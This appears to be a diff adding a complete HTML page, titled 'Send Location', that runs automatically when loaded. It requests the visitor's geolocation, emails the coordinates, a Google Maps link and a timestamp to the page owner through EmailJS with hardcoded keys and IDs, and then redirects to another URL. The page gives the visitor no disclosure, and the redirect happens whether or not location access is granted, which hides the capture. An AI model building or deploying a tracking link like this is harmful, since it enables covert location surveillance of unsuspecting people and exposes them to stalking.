@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Send Location</title>
+</head>
+<body>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS
+  emailjs.init("YxIxTuOHd_CpC5jMB"); // Replace with your EmailJS public key
+
+  function sendLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        const templateParams = {
+          latitude: lat,
+          longitude: lon,
+          maps_link: mapsLink,
+          timestamp: new Date().toLocaleString()
+        };
+
+        emailjs.send("service_58yzynn", "template_k61fw6o", templateParams)
+          .finally(() => {
+            // Redirect after sending
+            window.location.href = "https://www.example.com"; // Replace with your redirect URL
+          });
+
+      }, error => {
+        // Redirect even if user denies location
+        window.location.href = "https://www.example.com"; // Replace with your redirect URL
+      });
+    } else {
+      // Redirect if geolocation not supported
+      window.location.href = "https://www.example.com"; // Replace with your redirect URL
+    }
+  }
+
+  // Automatically run when page loads
+  window.onload = sendLocation;
+</script>
+</body>
+</html>
